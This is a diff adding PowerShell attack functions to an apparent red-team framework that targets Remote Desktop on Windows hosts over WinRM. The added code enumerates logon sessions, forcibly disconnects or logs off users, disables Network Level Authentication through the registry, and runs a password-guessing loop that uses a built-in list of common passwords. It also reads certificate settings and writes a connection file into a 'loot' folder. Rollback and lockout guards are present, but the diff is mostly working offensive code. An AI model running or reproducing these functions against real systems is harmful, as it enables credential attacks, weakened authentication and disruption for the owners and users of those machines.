@@ -6829,3 +6829,468 @@ function Invoke-ARModuleHopWinRm {
         Failed             = @($failures.ToArray())
     }
 }
+
+function Invoke-ARAttackRdpSessions {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'RDP sessions'
+    $session = Get-ARTargetSession
+    $data = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
+        # Two views of the same truth: the textual `query session` a human reads
+        # and the CIM logon records a script can count. Neither writes anything.
+        $query = @()
+        try { $query = @(query session 2>&1 | ForEach-Object { [string]$_ }) } catch { }
+        $quser = @()
+        try { $quser = @(quser 2>&1 | ForEach-Object { [string]$_ }) } catch { }
+        $links = @()
+        try { $links = @(Get-CimInstance -ClassName Win32_LoggedOnUser -ErrorAction Stop | Select-Object -First 500) } catch { }
+        $logons = @()
+        try {
+            # 2 interactive, 10 remote interactive, 12 cached remote interactive.
+            $logons = @(Get-CimInstance -ClassName Win32_LogonSession -ErrorAction Stop |
+                Where-Object { @(2, 10, 12) -contains [int]$_.LogonType } |
+                Select-Object -First 100)
+        }
+        catch { }
+        $rows = New-Object System.Collections.Generic.List[object]
+        foreach ($logon in $logons) {
+            $name = ''
+            $domain = ''
+            foreach ($link in $links) {
+                if ([string]$link.Dependent.LogonId -ne [string]$logon.LogonId) { continue }
+                $accountPath = [string]$link.Antecedent
+                if ($accountPath -match 'Name="([^"]*)"') { $name = $Matches[1] }
+                if ($accountPath -match 'Domain="([^"]*)"') { $domain = $Matches[1] }
+                if ($name -ne '') { break }
+            }
+            $rows.Add([pscustomobject]@{
+                LogonId   = [string]$logon.LogonId
+                LogonType = [int]$logon.LogonType
+                User      = $name
+                Domain    = $domain
+                StartTime = $logon.StartTime
+            })
+        }
+        return [pscustomobject]@{
+            QuerySession = @($query)
+            QUser        = @($quser)
+            Sessions     = @($rows.ToArray())
+        }
+    }
+    $raw = @($data.QuerySession)
+    if ($raw.Count -gt 0) { Show-ARText ($raw -join [Environment]::NewLine) }
+    $rows = @($data.Sessions)
+    if ($rows.Count -gt 0) {
+        $table = ($rows | Sort-Object LogonType, User | Format-Table -AutoSize | Out-String)
+        Show-ARText $table
+    }
+    else { Write-ARInfo 'The CIM query returned no interactive or remote logon sessions.' }
+    Set-ARStatus ('RDP sessions listed (' + $rows.Count + ')') 'Ok'
+    return [pscustomobject]@{
+        Id       = '720'
+        Action   = 'RdpSessions'
+        Target   = $target
+        Count    = $rows.Count
+        Sessions = $rows
+        Raw      = $raw
+    }
+}
+
+function Invoke-ARAttackRdpDisconnect {
+    param([string]$SessionId = '')
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'RDP disconnect'
+    $session = Get-ARTargetSession
+    if ($SessionId -eq '') {
+        $SessionId = Read-ARValue 'Session id to disconnect or log off' ''
+    }
+    if ($SessionId -notmatch '^\d+$') { throw ('A session id must be a number; got "' + $SessionId + '".') }
+    $mode = 'disconnect'
+    if (-not $script:ARAssumeYes) {
+        $answer = Read-ARValue 'Type D to disconnect, L to log off, anything else cancels' 'D'
+        if ($answer -match '^[Ll]') { $mode = 'logoff' }
+        elseif ($answer -notmatch '^[Dd]') {
+            Write-ARWarn 'Session kept: nothing was sent to the target.'
+            Set-ARStatus 'RDP session kept' 'Warn'
+            return [pscustomobject]@{
+                Id = '721'; Action = 'RdpDisconnect'; Target = $target
+                SessionId = [int]$SessionId; Mode = 'none'; Done = $false
+            }
+        }
+    }
+    $result = Invoke-Command -Session $session -ArgumentList ([int]$SessionId), $mode -ErrorAction Stop -ScriptBlock {
+        param($id, $how)
+        $before = @(query session 2>&1 | ForEach-Object { [string]$_ })
+        $present = $false
+        foreach ($line in $before) {
+            if ($line -match ('(^|\s)' + [string]$id + '(\s|$)')) { $present = $true; break }
+        }
+        if (-not $present) {
+            return [pscustomobject]@{ Found = $false; ExitCode = -1; Output = 'the id is not listed by query session'; Still = $false }
+        }
+        if ($how -eq 'logoff') { $output = @(logoff.exe $id 2>&1) }
+        else { $output = @(tsdiscon.exe $id 2>&1) }
+        $code = $LASTEXITCODE
+        Start-Sleep -Seconds 1
+        $after = @(query session 2>&1 | ForEach-Object { [string]$_ })
+        $still = $false
+        foreach ($line in $after) {
+            if ($line -match ('(^|\s)' + [string]$id + '(\s|$)')) { $still = $true; break }
+        }
+        return [pscustomobject]@{
+            Found    = $true
+            ExitCode = [int]$code
+            Output   = (($output | Out-String).Trim())
+            Still    = $still
+        }
+    }
+    if (-not $result.Found) { throw ('Session ' + $SessionId + ' is not present on ' + $target + '.') }
+    if ([int]$result.ExitCode -ne 0) {
+        throw ('The ' + $mode + ' of session ' + $SessionId + ' returned exit ' + [int]$result.ExitCode + ': ' + [string]$result.Output)
+    }
+    if ($result.Still) {
+        Write-ARWarn ('Session ' + $SessionId + ' is still listed; the service may need a moment to settle.')
+        Set-ARStatus ('Session ' + $SessionId + ' ' + $mode + ' requested') 'Warn'
+    }
+    else {
+        Write-ARSuccess ('Session ' + $SessionId + ' was ' + $mode + 'd on ' + $target + '.')
+        Set-ARStatus ('Session ' + $SessionId + ' ' + $mode) 'Ok'
+    }
+    return [pscustomobject]@{
+        Id        = '721'
+        Action    = 'RdpDisconnect'
+        Target    = $target
+        SessionId = [int]$SessionId
+        Mode      = $mode
+        Done      = $true
+        StillListed = [bool]$result.Still
+    }
+}
+
+function Invoke-ARAttackRdpNlaOff {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'RDP NLA off'
+    $session = Get-ARTargetSession
+    $keyPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
+    $written = $false
+    $succeeded = $false
+    try {
+        $state = Invoke-Command -Session $session -ArgumentList $keyPath -ErrorAction Stop -ScriptBlock {
+            param($path)
+            $entry = [pscustomobject]@{
+                KeyPath = $path
+                Name    = 'UserAuthentication'
+                Existed = $false
+                Value   = $null
+                Kind    = 'DWord'
+            }
+            try {
+                $key = Get-Item -LiteralPath $path -ErrorAction Stop
+                if (@($key.GetValueNames()) -contains 'UserAuthentication') {
+                    $entry.Existed = $true
+                    $entry.Value = $key.GetValue('UserAuthentication', $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
+                    $entry.Kind = [string]$key.GetValueKind('UserAuthentication')
+                }
+            }
+            catch { }
+            $before = $null
+            if ($entry.Existed) { $before = [int]$entry.Value }
+            if ($before -eq 0) {
+                return [pscustomobject]@{ Already = $true; Before = 0; After = 0; Entry = $entry }
+            }
+            New-ItemProperty -Path $path -Name 'UserAuthentication' -Value 0 -PropertyType DWORD -Force | Out-Null
+            $after = [int](Get-ItemProperty -Path $path -Name 'UserAuthentication' -ErrorAction Stop).UserAuthentication
+            return [pscustomobject]@{ Already = $false; Before = $before; After = $after; Entry = $entry }
+        }
+        # The oldest snapshot wins, exactly like 801: a second run must not record
+        # the value this action just wrote. Nothing is registered when NLA is
+        # already off, because there is nothing to put back.
+        if ($state.Already) {
+            Write-ARInfo 'UserAuthentication is already 0: NLA is off and nothing was written.'
+            Set-ARStatus 'NLA already off' 'Ok'
+        }
+        else {
+            $known = $false
+            foreach ($existing in $script:ARRegistryBackup) {
+                if ($existing.KeyPath -eq $keyPath -and $existing.Name -eq 'UserAuthentication') { $known = $true; break }
+            }
+            if (-not $known) { $script:ARRegistryBackup.Add($state.Entry) }
+            $written = $true
+            Write-ARSuccess ('UserAuthentication ' + [string]$state.Before + ' -> 0 on ' + $target + '.')
+            Write-ARWarn 'A TermService restart is required before clients can connect without NLA.'
+            Set-ARStatus 'NLA disabled' 'Ok'
+        }
+        $succeeded = $true
+        return [pscustomobject]@{
+            Id          = '722'
+            Action      = 'RdpNlaOff'
+            Target      = $target
+            KeyPath     = $keyPath
+            Before      = $state.Before
+            After       = [int]$state.After
+            Written     = [bool]$written
+            Restart     = [bool]$written
+        }
+    }
+    finally {
+        if ($written -and -not $succeeded) {
+            # A failed run must not leave NLA off: replay the snapshot the body
+            # just registered in ARRegistryBackup, then let global cleanup see it.
+            $snapshot = @($script:ARRegistryBackup | Where-Object { $_.KeyPath -eq $keyPath -and $_.Name -eq 'UserAuthentication' })
+            if ($snapshot.Count -gt 0) {
+                try {
+                    Invoke-Command -Session $session -ArgumentList (, $snapshot) -ErrorAction Stop -ScriptBlock {
+                        param($entries)
+                        foreach ($entry in $entries) {
+                            $path = [string]$entry.KeyPath
+                            if (-not (Test-Path -LiteralPath $path)) { continue }
+                            if (-not $entry.Existed) {
+                                Remove-ItemProperty -Path $path -Name ([string]$entry.Name) -Force -ErrorAction SilentlyContinue
+                                continue
+                            }
+                            New-ItemProperty -Path $path -Name ([string]$entry.Name) -Value ([int]$entry.Value) -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+                        }
+                    } | Out-Null
+                    Write-ARInfo 'UserAuthentication was replayed after the failed write.'
+                }
+                catch { Write-ARWarn ('UserAuthentication could not be replayed: ' + $_.Exception.Message) }
+            }
+        }
+    }
+}
+
+function Invoke-ARAttackRdpBrute {
+    param(
+        [string]$UserName = '',
+        [string]$PasswordList = '',
+        [int]$MaxAttempts = 5,
+        [int]$DelaySeconds = 5
+    )
+    if (-not $script:ARAssumeYes) {
+        throw 'RDP password probe refuses to run without -Yes: a rejection loop can lock the account out, so it never starts by accident.'
+    }
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'RDP password probe'
+    $session = Get-ARTargetSession
+    if ($UserName -eq '') { $UserName = Read-ARValue 'Account to probe' '' }
+    if ($UserName -notmatch '^[^\\/:*?"<>|]+$') { throw ('"' + $UserName + '" is not a usable account name.') }
+    if ($MaxAttempts -lt 1) { $MaxAttempts = 1 }
+    if ($MaxAttempts -gt 20) { $MaxAttempts = 20 }
+    if ($DelaySeconds -lt 1) { $DelaySeconds = 1 }
+    $candidates = @('Password1', 'P@ssw0rd', 'Welcome1', 'Admin123', 'Welcome123', 'Summer2025', 'Winter2025', 'Changeme1')
+    if ($PasswordList -ne '') {
+        if (-not (Test-Path -LiteralPath $PasswordList)) { throw ('Password list not found: ' + $PasswordList) }
+        $candidates = @(Get-Content -LiteralPath $PasswordList -ErrorAction Stop | ForEach-Object { ([string]$_).Trim() } | Where-Object { $_ -ne '' })
+    }
+    $candidates = @($candidates | Select-Object -First $MaxAttempts)
+    if ($candidates.Count -eq 0) { throw 'The password list is empty; nothing to try.' }
+    $domain = [string]$script:ARTarget['Domain']
+    $account = $UserName
+    if ($domain -ne '' -and $account -notmatch '\\') { $account = $domain + '\' + $account }
+    Write-ARWarn ('Probing ' + $UserName + ' with ' + $candidates.Count + ' candidate(s), ' + $DelaySeconds + 's apart. Credentials are checked against the target WinRM endpoint, which shares the account database with RDP.')
+    $found = $false
+    $attempts = 0
+    $lastResult = 'not started'
+    foreach ($candidate in $candidates) {
+        $state = Invoke-Command -Session $session -ArgumentList $UserName -ErrorAction Stop -ScriptBlock {
+            param($name)
+            $escaped = $name.Replace("'", "''")
+            $account = Get-CimInstance -ClassName Win32_UserAccount -Filter ("Name='" + $escaped + "'") -ErrorAction SilentlyContinue | Select-Object -First 1
+            if (-not $account) { return [pscustomobject]@{ Found = $false; Lockout = $false; Disabled = $false } }
+            return [pscustomobject]@{ Found = $true; Lockout = [bool]$account.Lockout; Disabled = [bool]$account.Disabled }
+        }
+        if (-not $state.Found) { throw ('The account ' + $UserName + ' does not exist on ' + $target + '.') }
+        if ($state.Lockout) { $lastResult = 'account locked out, probe stopped'; Write-ARWarn 'The account is locked out: nothing else was tried.'; break }
+        if ($state.Disabled) { $lastResult = 'account disabled, probe stopped'; Write-ARWarn 'The account is disabled: nothing else was tried.'; break }
+        $attempts++
+        Write-ARProgress -Activity 'RDP password probe' -Percent ([int](100 * $attempts / $candidates.Count)) -Status ('attempt ' + $attempts + ' of ' + $candidates.Count)
+        $secure = ConvertTo-SecureString -String $candidate -AsPlainText -Force
+        $credential = New-Object System.Management.Automation.PSCredential($account, $secure)
+        $probe = $null
+        try {
+            $probe = New-PSSession -ComputerName $target -Credential $credential -SessionOption (New-PSSessionOption -OpenTimeout 10000 -OperationTimeout 20000) -ErrorAction Stop
+            $found = $true
+            $lastResult = 'accepted on attempt ' + $attempts
+        }
+        catch {
+            $lastResult = 'rejected on attempt ' + $attempts
+        }
+        finally {
+            if ($probe) {
+                try { Remove-PSSession -Session $probe -ErrorAction SilentlyContinue } catch { }
+            }
+        }
+        if ($found) { break }
+        if ($attempts -lt $candidates.Count) { Start-Sleep -Seconds $DelaySeconds }
+    }
+    if ($found) {
+        Write-ARSuccess ('A working password was found for ' + $UserName + ' after ' + $attempts + ' attempt(s).')
+        Set-ARStatus 'RDP password probe found a match' 'Ok'
+    }
+    else {
+        Write-ARWarn ('No match after ' + $attempts + ' attempt(s): ' + $lastResult + '.')
+        Set-ARStatus 'RDP password probe finished' 'Warn'
+    }
+    return [pscustomobject]@{
+        Id        = '723'
+        Action    = 'RdpBrute'
+        Target    = $target
+        User      = $UserName
+        Attempts  = $attempts
+        Found     = [bool]$found
+        Result    = $lastResult
+        Mechanism = 'WinRM credential probe'
+    }
+}
+
+function Invoke-ARAttackRdpCertificate {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'RDP certificate'
+    $session = Get-ARTargetSession
+    $data = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
+        $keyPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
+        $thumbprint = ''
+        try {
+            $raw = (Get-ItemProperty -Path $keyPath -Name 'SSLCertificateSHA1Hash' -ErrorAction Stop).SSLCertificateSHA1Hash
+            if ($raw) { $thumbprint = (($raw | ForEach-Object { $_.ToString('X2') }) -join '') }
+        }
+        catch { }
+        $certificate = $null
+        if ($thumbprint -ne '') {
+            try {
+                $certificate = Get-ChildItem -Path 'Cert:\LocalMachine\My' -ErrorAction SilentlyContinue |
+                    Where-Object { [string]$_.Thumbprint -eq $thumbprint } | Select-Object -First 1
+            }
+            catch { }
+        }
+        if (-not $certificate) {
+            try {
+                $certificate = Get-ChildItem -Path 'Cert:\LocalMachine\Remote Desktop' -ErrorAction SilentlyContinue |
+                    Sort-Object NotAfter -Descending | Select-Object -First 1
+            }
+            catch { }
+        }
+        $port = 3389
+        try { $port = [int](Get-ItemProperty -Path $keyPath -Name 'PortNumber' -ErrorAction Stop).PortNumber } catch { }
+        $nla = $null
+        try { $nla = [int](Get-ItemProperty -Path $keyPath -Name 'UserAuthentication' -ErrorAction Stop).UserAuthentication } catch { }
+        $layer = $null
+        try { $layer = [int](Get-ItemProperty -Path $keyPath -Name 'SecurityLayer' -ErrorAction Stop).SecurityLayer } catch { }
+        $subject = ''
+        $issuer = ''
+        $notBefore = $null
+        $notAfter = $null
+        if ($certificate) {
+            $subject = [string]$certificate.Subject
+            $issuer = [string]$certificate.Issuer
+            $notBefore = $certificate.NotBefore
+            $notAfter = $certificate.NotAfter
+            if ($thumbprint -eq '') { $thumbprint = [string]$certificate.Thumbprint }
+        }
+        return [pscustomobject]@{
+            Thumbprint  = $thumbprint
+            Subject     = $subject
+            Issuer      = $issuer
+            NotBefore   = $notBefore
+            NotAfter    = $notAfter
+            Port        = $port
+            Nla         = $nla
+            SecurityLayer = $layer
+        }
+    }
+    $format = {
+        param($value)
+        if ($null -eq $value) { return '-' }
+        $text = [string]$value
+        if ($text -eq '') { return '-' }
+        return $text
+    }
+    $table = @(
+        [pscustomobject]@{ Field = 'Thumbprint'; Value = (& $format $data.Thumbprint) }
+        [pscustomobject]@{ Field = 'Subject';    Value = (& $format $data.Subject) }
+        [pscustomobject]@{ Field = 'Issuer';     Value = (& $format $data.Issuer) }
+        [pscustomobject]@{ Field = 'Not before'; Value = (& $format $data.NotBefore) }
+        [pscustomobject]@{ Field = 'Not after';  Value = (& $format $data.NotAfter) }
+        [pscustomobject]@{ Field = 'Port';       Value = (& $format $data.Port) }
+        [pscustomobject]@{ Field = 'NLA';        Value = (& $format $data.Nla) }
+        [pscustomobject]@{ Field = 'Security layer'; Value = (& $format $data.SecurityLayer) }
+    )
+    Show-ARText (($table | Format-Table -AutoSize | Out-String))
+    if ($null -ne $data.NotAfter) {
+        $days = [int][Math]::Floor(([datetime]$data.NotAfter - (Get-Date)).TotalDays)
+        if ($days -lt 0) { Write-ARWarn ('The RDP certificate expired ' + [Math]::Abs($days) + ' day(s) ago.') }
+        elseif ($days -lt 30) { Write-ARWarn ('The RDP certificate expires in ' + $days + ' day(s).') }
+    }
+    Set-ARStatus 'RDP certificate read' 'Ok'
+    return [pscustomobject]@{
+        Id          = '724'
+        Action      = 'RdpCertificate'
+        Target      = $target
+        Thumbprint  = [string]$data.Thumbprint
+        Subject     = [string]$data.Subject
+        Issuer      = [string]$data.Issuer
+        NotAfter    = $data.NotAfter
+        Port        = [int]$data.Port
+        Nla         = $data.Nla
+        SecurityLayer = $data.SecurityLayer
+    }
+}
+
+function Invoke-ARAttackRdpFile {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'RDP file'
+    $session = Get-ARTargetSession
+    $settings = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
+        $keyPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
+        $port = 3389
+        try { $port = [int](Get-ItemProperty -Path $keyPath -Name 'PortNumber' -ErrorAction Stop).PortNumber } catch { }
+        $nla = 1
+        try { $nla = [int](Get-ItemProperty -Path $keyPath -Name 'UserAuthentication' -ErrorAction Stop).UserAuthentication } catch { }
+        $layer = 2
+        try { $layer = [int](Get-ItemProperty -Path $keyPath -Name 'SecurityLayer' -ErrorAction Stop).SecurityLayer } catch { }
+        return [pscustomobject]@{ Port = $port; Nla = $nla; SecurityLayer = $layer }
+    }
+    $port = [int]$settings.Port
+    $address = $target
+    if ($port -ne 3389) { $address = $target + ':' + [string]$port }
+    $authenticationLevel = 2
+    if ([int]$settings.Nla -eq 0) { $authenticationLevel = 0 }
+    $negotiate = 1
+    if ([int]$settings.SecurityLayer -le 0) { $negotiate = 0 }
+    $lines = New-Object System.Collections.Generic.List[string]
+    $lines.Add('screen mode id:i:2')
+    $lines.Add('use multimon:i:1')
+    $lines.Add('desktopwidth:i:1920')
+    $lines.Add('desktopheight:i:1080')
+    $lines.Add('session bpp:i:32')
+    $lines.Add('full address:s:' + $address)
+    $lines.Add('prompt for credentials:i:0')
+    $lines.Add('authentication level:i:' + [string]$authenticationLevel)
+    $lines.Add('negotiate security layer:i:' + [string]$negotiate)
+    $lines.Add('audiomode:i:0')
+    $lines.Add('redirectclipboard:i:1')
+    $lines.Add('redirectprinters:i:0')
+    $lines.Add('autoreconnection enabled:i:1')
+    $lines.Add('bandwidthautodetect:i:1')
+    $lines.Add('networkautodetect:i:1')
+    $lines.Add('compression:i:1')
+    $lines.Add('connection type:i:7')
+    $user = [string]$script:ARTarget['User']
+    if ($user -ne '') { $lines.Add('username:s:' + $user) }
+    $directory = Get-ARLootDirectory 'rdp'
+    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
+    $path = Join-Path $directory ('rdp-' + $safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.rdp')
+    $encoding = New-Object System.Text.UTF8Encoding($false)
+    [System.IO.File]::WriteAllLines($path, $lines.ToArray(), $encoding)
+    Write-ARSuccess ('RDP file written to ' + $path)
+    Set-ARStatus 'RDP file generated' 'Ok'
+    return [pscustomobject]@{
+        Id                  = '725'
+        Action              = 'RdpFile'
+        Target              = $target
+        Path                = $path
+        Address             = $address
+        Port                = $port
+        AuthenticationLevel = $authenticationLevel
+        NegotiateSecurityLayer = $negotiate
+    }
+}
